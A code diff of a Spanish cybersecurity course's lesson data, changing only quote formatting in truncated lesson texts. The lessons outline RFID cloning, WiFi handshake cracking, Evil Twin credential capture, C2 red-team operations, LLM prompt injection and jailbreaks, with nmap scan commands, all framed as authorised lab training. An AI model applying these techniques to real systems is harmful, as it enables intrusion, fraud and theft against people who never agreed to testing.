-    "theory": "Introducir la radio definida por software (SDR) como herramienta para descubrir, capturar y analizar señales inalámbricas más allá de WiFi y Bluetooth: mandos remotos sub-GHz, sensores ISM, telemetría y protocolos propietarios. El alumno aprenderá conceptos de RF (IQ, frecuencia, ancho de banda, modulación), capturará señales con un RTL-SDR/HackRF y las demodulará para entender su contenido, respetando siempre la legalidad del espectro. > ⚠️ Nota ética y legal: recibir/escuchar puede estar restringido según jurisdicción; transmitir requiere licencia y equipo homologado. Practica solo con disp…",
+    "theory": "Introducir la radio definida por software (SDR) como herramienta para descubrir, capturar y analizar señales inalámbricas más allá de WiFi y Bluetooth: mandos remotos sub-GHz, sensores ISM, telemetría y protocolos propietarios. El alumno aprenderá conceptos de RF (IQ, frecuencia, ancho de banda, modulación), capturará señales con un RTL-SDR/HackRF y las demodulará para entender su contenido, respetando siempre la legalidad del espectro. ⚠️ Nota ética y legal: recibir/escuchar puede estar restringido según jurisdicción; transmitir requiere licencia y equipo homologado. Practica solo con dispos…",
     "outcomes": [
       "Explicar conceptos de RF: muestras IQ, frecuencia central, ancho de banda y modulación.",
       "Configurar un SDR (RTL-SDR/HackRF) con GQRX/SDR#.",
@@ -13961,7 +13961,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Comprender y auditar tecnologías RFID de baja frecuencia (125 kHz) y alta frecuencia/NFC (13.56 MHz): cómo funcionan las tarjetas de acceso y de transporte, sus debilidades criptográficas históricas (MIFARE Classic/Cryp…",
-    "theory": "Comprender y auditar tecnologías RFID de baja frecuencia (125 kHz) y alta frecuencia/NFC (13.56 MHz): cómo funcionan las tarjetas de acceso y de transporte, sus debilidades criptográficas históricas (MIFARE Classic/Crypto-1), y cómo leer, analizar y clonar tags propios con un Proxmark3. El alumno también entenderá los riesgos de los sistemas de control de acceso basados en credenciales de proximidad y cómo endurecerlos. > ⚠️ Nota ética: clona, lee o emula únicamente tarjetas de tu propiedad o con autorización explícita. Duplicar credenciales de acceso ajenas o defraudar sistemas de transporte…",
+    "theory": "Comprender y auditar tecnologías RFID de baja frecuencia (125 kHz) y alta frecuencia/NFC (13.56 MHz): cómo funcionan las tarjetas de acceso y de transporte, sus debilidades criptográficas históricas (MIFARE Classic/Crypto-1), y cómo leer, analizar y clonar tags propios con un Proxmark3. El alumno también entenderá los riesgos de los sistemas de control de acceso basados en credenciales de proximidad y cómo endurecerlos. ⚠️ Nota ética: clona, lee o emula únicamente tarjetas de tu propiedad o con autorización explícita. Duplicar credenciales de acceso ajenas o defraudar sistemas de transporte/p…",
     "outcomes": [
       "Distinguir RFID LF (125 kHz) de HF/NFC (13.56 MHz) y sus estándares.",
       "Leer e identificar tags con un Proxmark3.",
@@ -14013,7 +14013,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Auditar dispositivos Bluetooth Low Energy (BLE), el protocolo inalámbrico dominante en wearables, cerraduras, sensores y gadgets IoT.",
-    "theory": "Auditar dispositivos Bluetooth Low Energy (BLE), el protocolo inalámbrico dominante en wearables, cerraduras, sensores y gadgets IoT. El alumno entenderá la pila BLE (GAP/GATT), los modos de emparejamiento y sus debilidades, y aprenderá a escanear, enumerar servicios/características, interceptar y reproducir tramas, y manipular valores de un dispositivo propio con herramientas como bluetoothctl, gatttool, bettercap y un sniffer (nRF/Ubertooth). > ⚠️ Nota ética: interactúa solo con dispositivos BLE de tu propiedad o autorizados. Interceptar, manipular o denegar servicio a dispositivos ajenos (…",
+    "theory": "Auditar dispositivos Bluetooth Low Energy (BLE), el protocolo inalámbrico dominante en wearables, cerraduras, sensores y gadgets IoT. El alumno entenderá la pila BLE (GAP/GATT), los modos de emparejamiento y sus debilidades, y aprenderá a escanear, enumerar servicios/características, interceptar y reproducir tramas, y manipular valores de un dispositivo propio con herramientas como bluetoothctl, gatttool, bettercap y un sniffer (nRF/Ubertooth). ⚠️ Nota ética: interactúa solo con dispositivos BLE de tu propiedad o autorizados. Interceptar, manipular o denegar servicio a dispositivos ajenos (p.…",
     "outcomes": [
       "Describir la pila BLE: roles GAP, servicios y características GATT, y advertising.",
       "Escanear y enumerar dispositivos y sus servicios/características.",
@@ -14064,7 +14064,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Ejecutar ataques modernos contra redes WiFi WPA2/WPA3-PSK en un entorno propio y controlado: captura del handshake de 4 vías y del PMKID (sin necesidad de clientes conectados), crackeo offline con hashcat, y montaje de…",
-    "theory": "Ejecutar ataques modernos contra redes WiFi WPA2/WPA3-PSK en un entorno propio y controlado: captura del handshake de 4 vías y del PMKID (sin necesidad de clientes conectados), crackeo offline con hashcat, y montaje de un Evil Twin con portal cautivo para capturar credenciales. El alumno entenderá por qué el PMKID cambió el juego, cómo WPA3-SAE resiste estos ataques, y qué defensas aplicar. > ⚠️ Nota ética y legal: monta tu propio AP de laboratorio y ataca solo tu red. Capturar handshakes, clonar SSIDs o desautenticar clientes de redes ajenas es ilegal en la mayoría de jurisdicciones. Nunca o…",
+    "theory": "Ejecutar ataques modernos contra redes WiFi WPA2/WPA3-PSK en un entorno propio y controlado: captura del handshake de 4 vías y del PMKID (sin necesidad de clientes conectados), crackeo offline con hashcat, y montaje de un Evil Twin con portal cautivo para capturar credenciales. El alumno entenderá por qué el PMKID cambió el juego, cómo WPA3-SAE resiste estos ataques, y qué defensas aplicar. ⚠️ Nota ética y legal: monta tu propio AP de laboratorio y ataca solo tu red. Capturar handshakes, clonar SSIDs o desautenticar clientes de redes ajenas es ilegal en la mayoría de jurisdicciones. Nunca ope…",
     "outcomes": [
       "Poner una tarjeta WiFi en modo monitor y capturar tráfico 802.11.",
       "Capturar un handshake WPA2 de 4 vías y un PMKID.",
@@ -14115,7 +14115,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Entender la seguridad de los sistemas de control industrial (ICS) y SCADA que operan infraestructura crítica —agua, energía, manufactura— donde un fallo tiene consecuencias físicas.",
-    "theory": "Entender la seguridad de los sistemas de control industrial (ICS) y SCADA que operan infraestructura crítica —agua, energía, manufactura— donde un fallo tiene consecuencias físicas. El alumno aprenderá el modelo Purdue, los protocolos industriales inseguros por diseño (Modbus, DNP3, S7), la diferencia de prioridades entre TI y OT, y practicará enumeración y análisis de protocolos contra un simulador de laboratorio, nunca contra sistemas en producción. > ⚠️ Nota ética y de seguridad crítica: NUNCA escanees ni pruebes sistemas ICS/SCADA en producción; un simple escaneo puede detener procesos fí…",
+    "theory": "Entender la seguridad de los sistemas de control industrial (ICS) y SCADA que operan infraestructura crítica —agua, energía, manufactura— donde un fallo tiene consecuencias físicas. El alumno aprenderá el modelo Purdue, los protocolos industriales inseguros por diseño (Modbus, DNP3, S7), la diferencia de prioridades entre TI y OT, y practicará enumeración y análisis de protocolos contra un simulador de laboratorio, nunca contra sistemas en producción. ⚠️ Nota ética y de seguridad crítica: NUNCA escanees ni pruebes sistemas ICS/SCADA en producción; un simple escaneo puede detener procesos físi…",
     "outcomes": [
       "Describir el modelo Purdue y la segmentación TI/OT.",
       "Explicar por qué los protocolos ICS carecen de autenticación y cifrado.",
@@ -14166,7 +14166,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Entender la arquitectura de seguridad de un vehículo moderno y auditar su red interna a través del bus CAN.",
-    "theory": "Entender la arquitectura de seguridad de un vehículo moderno y auditar su red interna a través del bus CAN. El alumno aprenderá cómo se comunican las ECUs, cómo interceptar y analizar tramas con can-utils sobre una interfaz SocketCAN, cómo hacer ingeniería inversa de mensajes para identificar funciones, y cuáles son las superficies de ataque remotas (telemática, infoentretenimiento, TPMS), practicando exclusivamente en simuladores o vehículos propios. > ⚠️ Nota ética y de seguridad física: experimenta solo con tu propio vehículo (con el motor apagado y en lugar seguro) o con simuladores (ICSi…",
+    "theory": "Entender la arquitectura de seguridad de un vehículo moderno y auditar su red interna a través del bus CAN. El alumno aprenderá cómo se comunican las ECUs, cómo interceptar y analizar tramas con can-utils sobre una interfaz SocketCAN, cómo hacer ingeniería inversa de mensajes para identificar funciones, y cuáles son las superficies de ataque remotas (telemática, infoentretenimiento, TPMS), practicando exclusivamente en simuladores o vehículos propios. ⚠️ Nota ética y de seguridad física: experimenta solo con tu propio vehículo (con el motor apagado y en lugar seguro) o con simuladores (ICSim,…",
     "outcomes": [
       "Describir la arquitectura de red de un vehículo (ECUs, buses, gateway).",
       "Explicar la trama CAN y por qué carece de autenticación.",
@@ -14217,7 +14217,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "110 min",
     "description": "Comprender los riesgos de ciberseguridad únicos de los dispositivos médicos —donde un fallo puede causar daño físico directo a un paciente— y cómo se evalúan y regulan.",
-    "theory": "Comprender los riesgos de ciberseguridad únicos de los dispositivos médicos —donde un fallo puede causar daño físico directo a un paciente— y cómo se evalúan y regulan. El alumno estudiará la superficie de ataque de dispositivos implantables (marcapasos, bombas de insulina) y hospitalarios (bombas de infusión, monitores), los estándares y regulaciones aplicables (FDA, IEC 62304/80001, MDR), y el marco ético/legal que hace de esta un área especialmente sensible. > ⚠️ Nota ética y legal crítica: JAMÁS pruebes dispositivos médicos en uso clínico, conectados a pacientes o ajenos. La investigación…",
+    "theory": "Comprender los riesgos de ciberseguridad únicos de los dispositivos médicos —donde un fallo puede causar daño físico directo a un paciente— y cómo se evalúan y regulan. El alumno estudiará la superficie de ataque de dispositivos implantables (marcapasos, bombas de insulina) y hospitalarios (bombas de infusión, monitores), los estándares y regulaciones aplicables (FDA, IEC 62304/80001, MDR), y el marco ético/legal que hace de esta un área especialmente sensible. ⚠️ Nota ética y legal crítica: JAMÁS pruebes dispositivos médicos en uso clínico, conectados a pacientes o ajenos. La investigación l…",
     "outcomes": [
       "Describir la superficie de ataque de dispositivos médicos implantables y hospitalarios.",
       "Explicar por qué los sistemas médicos priorizan seguridad del paciente (safety) y disponibilidad.",
@@ -14248,7 +14248,7 @@ export const CLASSES = [
       "Técnicas heredadas de esta parte: análisis de firmware (267), hardware UART/JTAG (268), SDR (269) y BLE (271) aplicadas éticamente.",
       "Documentación regulatoria: FDA guidance, MDS2 (Manufacturer Disclosure Statement for Medical Device Security)."
     ],
-    "lab": "> Este laboratorio es de análisis y proceso, no ofensivo sobre hardware clínico. 1. Elige un caso público documentado (p. ej. vulnerabilidades divulgadas en bombas de infusión o marcapasos) a partir de avisos de la FDA/ICS-CERT (CISA). 2. Modela la amenaza: identifica activos (paciente, dosis, telemetría), vectores (RF, red, físico) y consecuencias de safety. 3. Mapea la superficie de ataque por…",
+    "lab": "Este laboratorio es de análisis y proceso, no ofensivo sobre hardware clínico. 1. Elige un caso público documentado (p. ej. vulnerabilidades divulgadas en bombas de infusión o marcapasos) a partir de avisos de la FDA/ICS-CERT (CISA). 2. Modela la amenaza: identifica activos (paciente, dosis, telemetría), vectores (RF, red, físico) y consecuencias de safety. 3. Mapea la superficie de ataque por ca…",
     "exercises": [
       "Enumera la superficie de ataque de un marcapasos con telemetría inalámbrica.",
       "Explica por qué en medicina la seguridad es un requisito de safety.",
@@ -15117,7 +15117,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "120 min",
     "description": "Comprender por qué existen los ejemplos adversariales y aprender a generarlos, evaluarlos y defenderlos con herramientas reales.",
-    "theory": "Comprender por qué existen los ejemplos adversariales y aprender a generarlos, evaluarlos y defenderlos con herramientas reales. El alumno pasará de la teoría del gradiente (FGSM, PGD) a un ataque práctico sobre un clasificador propio usando Adversarial Robustness Toolbox (ART), y medirá la caída de precisión bajo ataque. > ⚠️ Ética: los ataques de esta clase se realizan únicamente sobre modelos y datos propios en un laboratorio aislado. Atacar modelos de terceros sin autorización explícita puede ser ilegal.",
+    "theory": "Comprender por qué existen los ejemplos adversariales y aprender a generarlos, evaluarlos y defenderlos con herramientas reales. El alumno pasará de la teoría del gradiente (FGSM, PGD) a un ataque práctico sobre un clasificador propio usando Adversarial Robustness Toolbox (ART), y medirá la caída de precisión bajo ataque. ⚠️ Ética: los ataques de esta clase se realizan únicamente sobre modelos y datos propios en un laboratorio aislado. Atacar modelos de terceros sin autorización explícita puede ser ilegal.",
     "outcomes": [
       "Explicar por qué la linealidad local de las redes profundas produce ejemplos adversariales.",
       "Implementar ataques FGSM y PGD contra un modelo propio con ART.",
@@ -15170,7 +15170,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "120 min",
     "description": "Entender cómo un adversario contamina el proceso de aprendizaje —no la inferencia— para degradar el modelo o instalar una puerta trasera.",
-    "theory": "Entender cómo un adversario contamina el proceso de aprendizaje —no la inferencia— para degradar el modelo o instalar una puerta trasera. El alumno inyectará un backdoor con un trigger en un clasificador propio, verificará que se activa solo con el trigger, y aplicará técnicas de detección y saneamiento de datos. > ⚠️ Ética: el envenenamiento y las puertas traseras se practican solo sobre datasets y modelos propios en laboratorio aislado. Introducir backdoors en modelos de producción o de terceros es un delito.",
+    "theory": "Entender cómo un adversario contamina el proceso de aprendizaje —no la inferencia— para degradar el modelo o instalar una puerta trasera. El alumno inyectará un backdoor con un trigger en un clasificador propio, verificará que se activa solo con el trigger, y aplicará técnicas de detección y saneamiento de datos. ⚠️ Ética: el envenenamiento y las puertas traseras se practican solo sobre datasets y modelos propios en laboratorio aislado. Introducir backdoors en modelos de producción o de terceros es un delito.",
     "outcomes": [
       "Distinguir envenenamiento de disponibilidad (degradar) de envenenamiento dirigido/backdoor.",
       "Construir un ataque BadNets con un trigger visual sobre un clasificador propio.",
@@ -15222,7 +15222,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "110 min",
     "description": "Aprender cómo un adversario con solo acceso a la API de predicción puede robar la funcionalidad de un modelo (model extraction), reconstruir datos de entrenamiento (model inversion) o determinar si un registro estuvo en…",
-    "theory": "Aprender cómo un adversario con solo acceso a la API de predicción puede robar la funcionalidad de un modelo (model extraction), reconstruir datos de entrenamiento (model inversion) o determinar si un registro estuvo en el entrenamiento (membership inference). El alumno ejecutará una extracción sobre un modelo propio y aplicará defensas como rate limiting, ruido en la salida y marcas de agua. > ⚠️ Ética: todas las extracciones se hacen contra un modelo propio. Consultar masivamente APIs de terceros para copiar sus modelos viola los términos de servicio y puede ser ilegal.",
+    "theory": "Aprender cómo un adversario con solo acceso a la API de predicción puede robar la funcionalidad de un modelo (model extraction), reconstruir datos de entrenamiento (model inversion) o determinar si un registro estuvo en el entrenamiento (membership inference). El alumno ejecutará una extracción sobre un modelo propio y aplicará defensas como rate limiting, ruido en la salida y marcas de agua. ⚠️ Ética: todas las extracciones se hacen contra un modelo propio. Consultar masivamente APIs de terceros para copiar sus modelos viola los términos de servicio y puede ser ilegal.",
     "outcomes": [
       "Explicar las tres familias: extracción, inversión e inferencia de membresía.",
       "Ejecutar un ataque de extracción entrenando un modelo sustituto a partir de consultas.",
@@ -15327,7 +15327,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "120 min",
     "description": "Entender a fondo la vulnerabilidad número uno de las aplicaciones con LLM: la prompt injection, y su primo el jailbreak.",
-    "theory": "Entender a fondo la vulnerabilidad número uno de las aplicaciones con LLM: la prompt injection, y su primo el jailbreak. El alumno aprenderá la diferencia entre injection directa e indirecta, ejecutará pruebas de red teaming con garak y PyRIT sobre un endpoint propio, y diseñará defensas en capas conscientes de que no existe una solución perfecta. > ⚠️ Ética: las pruebas de injection y jailbreak se ejecutan solo contra modelos y endpoints propios o con autorización explícita. Extraer contenido prohibido o atacar servicios ajenos es ilícito.",
+    "theory": "Entender a fondo la vulnerabilidad número uno de las aplicaciones con LLM: la prompt injection, y su primo el jailbreak. El alumno aprenderá la diferencia entre injection directa e indirecta, ejecutará pruebas de red teaming con garak y PyRIT sobre un endpoint propio, y diseñará defensas en capas conscientes de que no existe una solución perfecta. ⚠️ Ética: las pruebas de injection y jailbreak se ejecutan solo contra modelos y endpoints propios o con autorización explícita. Extraer contenido prohibido o atacar servicios ajenos es ilícito.",
     "outcomes": [
       "Distinguir prompt injection directa, indirecta y jailbreak.",
       "Explicar por qué la causa raíz es la mezcla de datos e instrucciones en un mismo canal.",
@@ -15379,7 +15379,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Asegurar las arquitecturas de LLM más potentes y más peligrosas: RAG (Retrieval-Augmented Generation) y agentes con herramientas.",
-    "theory": "Asegurar las arquitecturas de LLM más potentes y más peligrosas: RAG (Retrieval-Augmented Generation) y agentes con herramientas. El alumno aprenderá dónde entran los datos no confiables, cómo un documento hostil o una herramienta mal aislada convierte una injection en acciones reales, y diseñará controles de aislamiento, mínimo privilegio y aprobación humana. > ⚠️ Ética: las pruebas de compromiso de agentes se hacen sobre sistemas propios en laboratorio aislado, con herramientas simuladas o sandboxeadas. Nunca contra sistemas de terceros.",
+    "theory": "Asegurar las arquitecturas de LLM más potentes y más peligrosas: RAG (Retrieval-Augmented Generation) y agentes con herramientas. El alumno aprenderá dónde entran los datos no confiables, cómo un documento hostil o una herramienta mal aislada convierte una injection en acciones reales, y diseñará controles de aislamiento, mínimo privilegio y aprobación humana. ⚠️ Ética: las pruebas de compromiso de agentes se hacen sobre sistemas propios en laboratorio aislado, con herramientas simuladas o sandboxeadas. Nunca contra sistemas de terceros.",
     "outcomes": [
       "Modelar las fronteras de confianza de un pipeline RAG y de un agente.",
       "Identificar cómo la injection indirecta escala a ejecución de acciones (Excessive Agency).",
@@ -15483,7 +15483,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "100 min",
     "description": "Comprender cómo los atacantes aprovechan la IA generativa —phishing hiperpersonalizado, deepfakes de voz e imagen, malware asistido, automatización de reconocimiento— y, sobre todo, cómo defenderse: detección de conteni…",
-    "theory": "Comprender cómo los atacantes aprovechan la IA generativa —phishing hiperpersonalizado, deepfakes de voz e imagen, malware asistido, automatización de reconocimiento— y, sobre todo, cómo defenderse: detección de contenido sintético, procedencia (C2PA), verificación fuera de banda y concienciación. El enfoque es defensivo: entender la amenaza para neutralizarla. > ⚠️ Ética: esta clase describe capacidades ofensivas con fines de defensa. No generamos deepfakes de personas reales, ni contenido para fraude, ni malware funcional. Cualquier prueba usa material propio y consentido, en laboratorio ai…",
+    "theory": "Comprender cómo los atacantes aprovechan la IA generativa —phishing hiperpersonalizado, deepfakes de voz e imagen, malware asistido, automatización de reconocimiento— y, sobre todo, cómo defenderse: detección de contenido sintético, procedencia (C2PA), verificación fuera de banda y concienciación. El enfoque es defensivo: entender la amenaza para neutralizarla. ⚠️ Ética: esta clase describe capacidades ofensivas con fines de defensa. No generamos deepfakes de personas reales, ni contenido para fraude, ni malware funcional. Cualquier prueba usa material propio y consentido, en laboratorio aisl…",
     "outcomes": [
       "Catalogar los usos ofensivos de la IA generativa y su impacto.",
       "Explicar cómo funcionan los deepfakes de voz e imagen a alto nivel.",
@@ -15640,7 +15640,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Que el alumno interiorice la metodología y la mentalidad que exige el OSCP: enumeración exhaustiva, toma de notas disciplinada, gestión del tiempo bajo presión y persistencia (\"Try Harder\") sin caer en la frustración im…",
-    "theory": "Que el alumno interiorice la metodología y la mentalidad que exige el OSCP: enumeración exhaustiva, toma de notas disciplinada, gestión del tiempo bajo presión y persistencia (\"Try Harder\") sin caer en la frustración improductiva. No se trata de memorizar exploits, sino de tener un proceso repetible que funcione contra máquinas desconocidas. > ⚠️ Ética y legalidad: todo lo aquí descrito se practica únicamente en laboratorios propios, plataformas autorizadas (HTB, PG Play, TryHackMe) o el laboratorio oficial de Offensive Security. Escanear o explotar sistemas de terceros sin permiso escrito es…",
+    "theory": "Que el alumno interiorice la metodología y la mentalidad que exige el OSCP: enumeración exhaustiva, toma de notas disciplinada, gestión del tiempo bajo presión y persistencia (\"Try Harder\") sin caer en la frustración improductiva. No se trata de memorizar exploits, sino de tener un proceso repetible que funcione contra máquinas desconocidas. ⚠️ Ética y legalidad: todo lo aquí descrito se practica únicamente en laboratorios propios, plataformas autorizadas (HTB, PG Play, TryHackMe) o el laboratorio oficial de Offensive Security. Escanear o explotar sistemas de terceros sin permiso escrito es d…",
     "outcomes": [
       "Aplicar una metodología de enumeración → explotación → escalada → documentación repetible.",
       "Gestionar el tiempo de un examen de 24 h con un plan de puntos y rotación de objetivos.",
@@ -15673,7 +15673,7 @@ export const CLASSES = [
       "Plataformas de práctica autorizadas: HTB, Proving Grounds Play/Practice, TryHackMe.",
       "Plantilla de informe (la reutilizarás en la Clase 303)."
     ],
-    "lab": "> Practica solo en máquinas de plataformas autorizadas o propias. 1. Prepara la plantilla de notas. Crea en Obsidian un nodo por máquina con secciones: Recon, Servicios, Vulnerabilidades, Foothold, PrivEsc, Loot, Screenshots. 2. Enumeración de puertos. Lanza un escaneo completo: ``bash nmap -p- --min-rate 2000 -oN nmap-full.txt 10.10.10.10 nmap -p 22,80,445 -sVC -oN nmap-serv.txt 10.10.10.10 ` 3.…",
+    "lab": "Practica solo en máquinas de plataformas autorizadas o propias. 1. Prepara la plantilla de notas. Crea en Obsidian un nodo por máquina con secciones: Recon, Servicios, Vulnerabilidades, Foothold, PrivEsc, Loot, Screenshots. 2. Enumeración de puertos. Lanza un escaneo completo: ``bash nmap -p- --min-rate 2000 -oN nmap-full.txt 10.10.10.10 nmap -p 22,80,445 -sVC -oN nmap-serv.txt 10.10.10.10 ` 3. E…",
     "exercises": [
       "Redacta tu checklist de enumeración de una página (puertos → servicios → web → SMB → escalada).",
       "Resuelve tres máquinas fáciles documentándolas con la plantilla completa.",
@@ -15694,7 +15694,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "150 min",
     "description": "Ejecutar un pentest end-to-end contra un laboratorio propio multi-máquina, siguiendo una metodología profesional (PTES / NIST SP 800-115) y entregando un informe formal con hallazgos, puntuación CVSS y recomendaciones d…",
-    "theory": "Ejecutar un pentest end-to-end contra un laboratorio propio multi-máquina, siguiendo una metodología profesional (PTES / NIST SP 800-115) y entregando un informe formal con hallazgos, puntuación CVSS y recomendaciones de remediación. Este capstone integra las Partes 6 (web), 7 (redes/infra), 8 (Active Directory) y 9 (post-explotación) en un único proyecto verificable. > ⚠️ Ética y legalidad: el objetivo es tu propio laboratorio (VulnHub, máquinas construidas por ti, un rango AD de práctica). Nunca ejecutes este capstone contra sistemas de terceros sin autorización escrita.",
+    "theory": "Ejecutar un pentest end-to-end contra un laboratorio propio multi-máquina, siguiendo una metodología profesional (PTES / NIST SP 800-115) y entregando un informe formal con hallazgos, puntuación CVSS y recomendaciones de remediación. Este capstone integra las Partes 6 (web), 7 (redes/infra), 8 (Active Directory) y 9 (post-explotación) en un único proyecto verificable. ⚠️ Ética y legalidad: el objetivo es tu propio laboratorio (VulnHub, máquinas construidas por ti, un rango AD de práctica). Nunca ejecutes este capstone contra sistemas de terceros sin autorización escrita.",
     "outcomes": [
       "Planificar un pentest con alcance, reglas de enfrentamiento y objetivos definidos.",
       "Ejecutar las 7 fases de PTES contra un entorno realista.",
@@ -15726,7 +15726,7 @@ export const CLASSES = [
       "Gestión: Obsidian/CherryTree para notas, plantilla de informe (Markdown o Word).",
       "CVSS calculator (FIRST.org)."
     ],
-    "lab": "> Solo contra tu propio laboratorio. 1. Pre-engagement. Escribe un documento de alcance: IPs objetivo, ventana de tiempo, técnicas permitidas, objetivos (\"obtener Domain Admin y exfiltrar flag.txt\"). 2. Recon e intel. Enumera toda la red: nmap -p- --min-rate 2000 a cada host y -sVC a los puertos abiertos. 3. Análisis de vulnerabilidades. Cruza servicios con searchsploit; identifica web (OWASP Top…",
+    "lab": "Solo contra tu propio laboratorio. 1. Pre-engagement. Escribe un documento de alcance: IPs objetivo, ventana de tiempo, técnicas permitidas, objetivos (\"obtener Domain Admin y exfiltrar flag.txt\"). 2. Recon e intel. Enumera toda la red: nmap -p- --min-rate 2000 a cada host y -sVC a los puertos abiertos. 3. Análisis de vulnerabilidades. Cruza servicios con searchsploit; identifica web (OWASP Top 1…",
     "exercises": [
       "Redacta el documento de alcance y RoE de tu laboratorio.",
       "Genera un mapa de red con hosts, servicios y hallazgos.",
@@ -15800,7 +15800,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "150 min",
     "description": "Ejecutar una operación Red Team completa contra tu laboratorio, simulando un adversario con objetivos de negocio (no solo \"hackear máquinas\"): reconocimiento, acceso inicial, establecimiento de C2, movimiento lateral, e…",
-    "theory": "Ejecutar una operación Red Team completa contra tu laboratorio, simulando un adversario con objetivos de negocio (no solo \"hackear máquinas\"): reconocimiento, acceso inicial, establecimiento de C2, movimiento lateral, escalada, consecución de objetivos y evasión, todo mapeado a MITRE ATT&CK. Integra la Parte 9 (Red Team/C2), la Parte 8 (AD) y la Parte 5 (evasión/OPSEC), y produce un informe orientado a mejorar la detección del Blue Team. > ⚠️ Ética y legalidad: operación exclusivamente contra infraestructura propia o con autorización escrita y alcance firmado. El uso de C2, malware o técnicas…",
+    "theory": "Ejecutar una operación Red Team completa contra tu laboratorio, simulando un adversario con objetivos de negocio (no solo \"hackear máquinas\"): reconocimiento, acceso inicial, establecimiento de C2, movimiento lateral, escalada, consecución de objetivos y evasión, todo mapeado a MITRE ATT&CK. Integra la Parte 9 (Red Team/C2), la Parte 8 (AD) y la Parte 5 (evasión/OPSEC), y produce un informe orientado a mejorar la detección del Blue Team. ⚠️ Ética y legalidad: operación exclusivamente contra infraestructura propia o con autorización escrita y alcance firmado. El uso de C2, malware o técnicas d…",
     "outcomes": [
       "Definir objetivos y escenario de amenaza (threat emulation) de una operación.",
       "Desplegar una infraestructura C2 con redirectores y OPSEC básica.",
@@ -15833,7 +15833,7 @@ export const CLASSES = [
       "Registro: matriz ATT&CK Navigator para marcar técnicas ejecutadas.",
       "Plantilla de informe orientada a detección."
     ],
-    "lab": "> Solo en tu laboratorio o con autorización escrita. 1. Define el escenario. Elige un adversario a emular y su conjunto de TTP en ATT&CK Navigator; fija el objetivo (\"comprometer el controlador de dominio y exfiltrar secret.docx\"). 2. Despliega C2. Levanta tu servidor (Sliver/Mythic) en una VM y un redirector Nginx delante; verifica el callback. 3. Acceso inicial. Genera un payload y simula su en…",
+    "lab": "Solo en tu laboratorio o con autorización escrita. 1. Define el escenario. Elige un adversario a emular y su conjunto de TTP en ATT&CK Navigator; fija el objetivo (\"comprometer el controlador de dominio y exfiltrar secret.docx\"). 2. Despliega C2. Levanta tu servidor (Sliver/Mythic) en una VM y un redirector Nginx delante; verifica el callback. 3. Acceso inicial. Genera un payload y simula su entr…",
     "exercises": [
       "Construye la capa ATT&CK Navigator del adversario emulado.",
       "Diseña el diagrama de tu infraestructura C2 con redirector.",
@@ -15907,7 +15907,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "150 min",
     "description": "Conducir una investigación DFIR completa sobre un incidente simulado: desde la detección y contención hasta la adquisición forense, el análisis (disco, memoria, línea de tiempo), la erradicación, la recuperación y el in…",
-    "theory": "Conducir una investigación DFIR completa sobre un incidente simulado: desde la detección y contención hasta la adquisición forense, el análisis (disco, memoria, línea de tiempo), la erradicación, la recuperación y el informe con lecciones aprendidas. Sigue el ciclo de NIST SP 800-61 e integra las Partes 12 (DFIR/forense) y 13 (análisis de malware), manteniendo cadena de custodia en todo momento. > ⚠️ Ética y legalidad: trabaja sobre imágenes y VMs propias o de laboratorios diseñados para ello. Manejar evidencia de sistemas reales exige autorización, cadena de custodia formal y, a menudo, requ…",
+    "theory": "Conducir una investigación DFIR completa sobre un incidente simulado: desde la detección y contención hasta la adquisición forense, el análisis (disco, memoria, línea de tiempo), la erradicación, la recuperación y el informe con lecciones aprendidas. Sigue el ciclo de NIST SP 800-61 e integra las Partes 12 (DFIR/forense) y 13 (análisis de malware), manteniendo cadena de custodia en todo momento. ⚠️ Ética y legalidad: trabaja sobre imágenes y VMs propias o de laboratorios diseñados para ello. Manejar evidencia de sistemas reales exige autorización, cadena de custodia formal y, a menudo, requis…",
     "outcomes": [
       "Aplicar el ciclo de IR de NIST (preparación → detección → contención → erradicación → recuperación → lecciones).",
       "Adquirir evidencia (disco y memoria) preservando integridad y cadena de custodia.",
@@ -15941,7 +15941,7 @@ export const CLASSES = [
       "Malware (Parte 13): sandbox aislado, CyberChef, capa.",
       "Plantilla de informe DFIR y hoja de cadena de custodia."
     ],
-    "lab": "> Solo con evidencia propia o de laboratorio autorizado, en entorno aislado. 1. Preparación. Ten listos formularios de cadena de custodia y un almacenamiento con hashing. 2. Detección/triage. A partir de una alerta (p. ej. del SIEM de la Clase 306), confirma el incidente y clasifícalo. 3. Contención. Aísla la VM comprometida (snapshot + red desconectada) sin destruir evidencia volátil. 4. Adquisi…",
+    "lab": "Solo con evidencia propia o de laboratorio autorizado, en entorno aislado. 1. Preparación. Ten listos formularios de cadena de custodia y un almacenamiento con hashing. 2. Detección/triage. A partir de una alerta (p. ej. del SIEM de la Clase 306), confirma el incidente y clasifícalo. 3. Contención. Aísla la VM comprometida (snapshot + red desconectada) sin destruir evidencia volátil. 4. Adquisici…",
     "exercises": [
       "Rellena una hoja de cadena de custodia para una imagen de disco.",
       "Identifica un proceso malicioso con malfind y explica la evidencia.",
@@ -15962,7 +15962,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "150 min",
     "description": "Ejecutar una campaña de bug bounty ética y estructurada: elegir un programa, leer y respetar su alcance, hacer reconocimiento eficiente, priorizar vectores de alto impacto, validar hallazgos con PoC reproducibles y reda…",
